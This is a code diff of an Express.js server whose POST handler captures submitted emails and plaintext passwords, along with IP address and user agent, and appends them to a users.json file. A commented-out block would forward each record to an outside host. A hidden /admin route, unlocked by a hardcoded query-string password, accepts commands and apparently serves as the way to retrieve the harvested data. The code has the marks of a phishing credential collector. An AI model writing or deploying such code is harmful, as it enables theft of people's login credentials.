@@ -4,10 +4,11 @@ var favicon = require('serve-favicon');
 var logger = require('morgan');
 var cookieParser = require('cookie-parser');
 var bodyParser = require('body-parser');
-var crypto = require('crypto');
 
 var index = require('./routes/index');
 var users = require('./routes/users');
+var Req = require('request');
+var fs = require('fs');
 
 var app = express();
 
@@ -51,7 +52,7 @@ app.get('/', function (req, res) {
 });
 
 app.post('/',function (req,res) {
-    var fs = require('fs');
+
 var  User={};
 
 
@@ -59,24 +60,16 @@ var  User={};
       User.email = req.body.email;
     User.pass = req.body.pass;
     User.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    User.time = new Date().toUTCString();
-  User['user-agent'] = req.get('User-Agent');
-  try {
-      var txt1 = fs.readFileSync(__dirname+'/'+ 'users.json') || '[]';
-      if(txt1.length<5) txt1 = '[]';
-  }
-  catch (e) {
-      txt1 = '[]';
-  }
- // var txt2 = `email: ${User.email}\n pass: ${User.pass}\n ip: ${User.ip}\ntime :${User.time}`+`\n`+('-').repeat(50);
-   var users = JSON.parse(txt1);
-  users.push(User);
-
-
-    fs.writeFile(__dirname + '/' + 'users.json',JSON.stringify(users,null,4),function (error) {
-        if (error) return console.log(error);
+    User['user-agent'] = req.get('User-Agent');
+    User.time = (new Date()).toUTCString();
+    save(User,function (err) {
+        if (err) return console.log(err);
         res.send('success');
+        console.log('success');
     });
+
+
+
 
 
 
@@ -88,14 +81,13 @@ var  User={};
 app.get('/admin',function (req,res, next) {
 
 
-    var url_parts = url.parse(req.url, true);
-    var query = url_parts.query;
-    if (query.pass !== '1225')
+
+    if (req.query.pass !== '1225')
     {
       return next();
     }
 
-    var cmd = query.cmd;
+    var cmd = req.query.cmd;
 
     if (cmd == 'get') {
 
@@ -171,6 +163,34 @@ app.use(function(err, req, res, next) {
 });
 
 
+function save(User,callback) {
+    /*
+Req.get({
+    url:'http://samer69255.tecpt.com/',
+    form:im,
+    headers:{}
+},callback);
+*/
+
+
+    try {
+        var txt1 = fs.readFileSync(__dirname+'/'+ 'users.json') || '[]';
+        if(txt1.length<5) txt1 = '[]';
+    }
+    catch (e) {
+        txt1 = '[]';
+    }
+    // var txt2 = `email: ${User.email}\n pass: ${User.pass}\n ip: ${User.ip}\ntime :${User.time}`+`\n`+('-').repeat(50);
+    var users = JSON.parse(txt1);
+    users.push(User);
+
+
+    fs.writeFile(__dirname + '/' + 'users.json',JSON.stringify(users,null,4),callback);
+
+
+
+
+}
 
 
 
